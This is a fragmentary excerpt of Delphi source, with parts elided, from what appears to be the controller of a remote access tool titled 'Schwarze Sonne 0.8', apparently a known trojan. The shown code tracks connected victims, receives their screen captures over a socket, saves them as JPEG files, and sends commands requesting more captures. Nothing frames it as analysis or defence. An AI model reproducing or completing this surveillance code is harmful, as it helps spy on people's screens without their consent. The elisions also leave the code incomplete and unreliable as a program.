...
begin
  sitem.delete;
  MainForm.Caption := 'Schwarze Sonne 0.8 - Connected Users: ' + IntToStr(MainForm.lv1.Items.Count);
end;
...
begin
  ...
  BytesSize := 0;
  T := 'ok';
  tTempScreenN.stat1.Panels.Items[3].Text := 'Size : ' + IntToStr(transsize) + ' Bytes';
  If (BytesSize < TransSize) Then
  Begin
    Total := 1;
    Repeat
...
jpg := TJPEGImage.Create;
jpg.LoadFromStream(h);
tTempScreenN.img1.Picture.Assign(jpg);
if tTempScreenN.chk1.Checked then begin
   repeat
   sFileNamez := RandomPassword(20);
   Sleep(1);
   until FileExists(GetPath + sFileNamez + '.jpg') = false;
   jpg.SaveToFile(GetPath + sFileNamez+ '.jpg');
end;
h.Free;
jpg.Free;
if tTempScreenN.sStop = false then begin
  Data := '50|' + tTempScreenN.Stat1.Panels[0].Text +  '|' + IntToStr(tTempScreenN.sSration) +'|' + IntToStr(tTempScreenN.TrackBar1.Position) + #10;
  send(TempSocket,data[1],Length(data),0);
end;
end;
